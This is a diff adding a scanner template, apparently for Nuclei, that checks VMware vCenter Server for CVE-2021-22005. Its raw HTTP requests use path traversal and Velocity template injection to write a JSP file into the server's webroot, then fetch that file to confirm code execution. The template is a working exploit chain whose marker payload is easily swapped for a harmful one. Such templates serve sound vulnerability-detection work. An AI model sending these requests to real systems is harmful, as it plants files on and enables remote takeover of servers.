@@ -1,0 +1,62 @@
+id: cve-2021-22005
+info:
+  name: VMware vCenter Server Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    VMware vCenter Server contains a remote code execution vulnerability that allows attackers to upload custom files and execute code.
+  tags: cve,rce,vmware,vcenter
+  reference:
+    - https://kb.vmware.com/s/article/85717
+    - https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee
+    - https://attackerkb.com/topics/15E0q0tdEZ/cve-2021-22005
+  classification:
+    cve-id: CVE-2021-22005
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+variables:
+  agent_name: '{{rand_base(8)}}'
+  log_param: '{{rand_base(8)}}'
+  secret: '{{rand_base(8)}}'
+  filename: '{{rand_base(8)}}.jsp'
+  payload: '<% out.println("test_payload"); %>'
+
+http:
+  - raw:
+      - |
+        POST /analytics/ceip/sdk/..;/..;/ph/api/dataapp/agent?_c={{agent_name}}&_i={{log_param}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Deployment-Secret: {{secret}}
+        Content-Type: application/json
+
+        {}
+
+  - raw:
+      - |
+        POST /analytics/ceip/sdk/..;/..;/ph/api/dataapp/agent?action=collect&_c={{agent_name}}&_i={{log_param}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Deployment-Secret: {{secret}}
+        Content-Type: application/json
+
+        {
+          "manifestContent": "<manifest recommendedPageSize=\"500\">\n  <request>\n    <query name=\"vir:VCenter\">\n      <constraint>\n        <targetType>ServiceInstance</targetType>\n      </constraint>\n      <propertySpec>\n        <propertyNames>content.about.instanceUuid</propertyNames>\n        <propertyNames>content.about.osType</propertyNames>\n        <propertyNames>content.about.build</propertyNames>\n        <propertyNames>content.about.version</propertyNames>\n      </propertySpec>\n    </query>\n  </request>\n  <cdfMapping>\n    <indepedentResultsMapping>\n      <resultSetMappings>\n        <entry>\n          <key>vir:VCenter</key>\n          <value>\n            <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n              <resourceItemToJsonLdMapping>\n                <forType>ServiceInstance</forType>\n                <mappingCode><![CDATA[\n                  #set($appender = $GLOBAL-logger.logger.parent.getAppender(\"LOGFILE\"))##\n                  #set($orig_log = $appender.getFile())##\n                  #set($logger = $GLOBAL-logger.logger.parent)##\n                  $appender.setFile(\"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/{{filename}}\")##\n                  $appender.activateOptions()##\n                  $logger.warn(\"{{payload}}\")##\n                  $appender.setFile($orig_log)##\n                  $appender.activateOptions()##]]></mappingCode>\n              </resourceItemToJsonLdMapping>\n            </value>\n          </value>\n        </entry>\n      </resultSetMappings>\n    </indepedentResultsMapping>\n  </cdfMapping>\n  <requestSchedules>\n    <schedule interval=\"1h\">\n      <queries>\n        <query>vir:VCenter</query>\n      </queries>\n    </schedule>\n  </requestSchedules>\n</manifest>"
+        }
+
+  - raw:
+      - |
+        GET /idm/..;/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "test_payload"
+        part: body
+      - type: regex
+        regex:
+          - "<%\\s*out\\.println\\(\\\"test_payload\\\"\\);\\s*%>"    # Fixed escape sequence issue for regex in YAML.
